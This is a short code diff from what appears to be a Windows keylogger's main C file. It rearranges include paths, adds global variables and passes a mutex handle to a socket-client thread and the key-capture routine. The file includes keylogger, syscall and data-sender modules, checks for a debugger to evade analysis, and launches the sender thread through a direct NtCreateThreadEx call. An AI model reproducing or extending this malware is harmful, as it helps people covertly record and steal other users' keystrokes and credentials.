@@ -3,11 +3,15 @@
 #include <windows.h>
 
 #include "keylogger/keylogger.h"
-#include "utils/utils.h"
-#include "utils/initializer.h"
+#include "utils/common/utils.h"
+#include "utils/init/initializer.h"
 #include "syscalls/syscalls.h"
 #include "sender/sender.h"
 #include "main.h"
+
+
+char* userId = NULL;
+char* result = NULL;
 
 
 BOOL isDebuggerDetected() {
@@ -56,12 +60,12 @@ int main() {
         goto CLEANUP;
     }
 
-    Status = NtCreateThreadEx(&thread, THREAD_QUERY_INFORMATION, NULL, GetCurrentProcess(), (long int (*)(void *))initSocketClient, NULL, FALSE, 0, 0, 0, NULL);
+    Status = NtCreateThreadEx(&thread, THREAD_QUERY_INFORMATION, NULL, GetCurrentProcess(), (long int (*)(void *))initSocketClient, (void*)hMutex, FALSE, 0, 0, 0, NULL);
     if (STATUS_SUCCESS != Status) {
         goto CLEANUP;
     }
 
-    start(ctx.pressedKeys, ctx.keys, ctx.combinations, ctx.set);
+    start(ctx.pressedKeys, ctx.keys, ctx.combinations, ctx.set, hMutex);
 
 CLEANUP:
     destroyAppContext(&ctx);
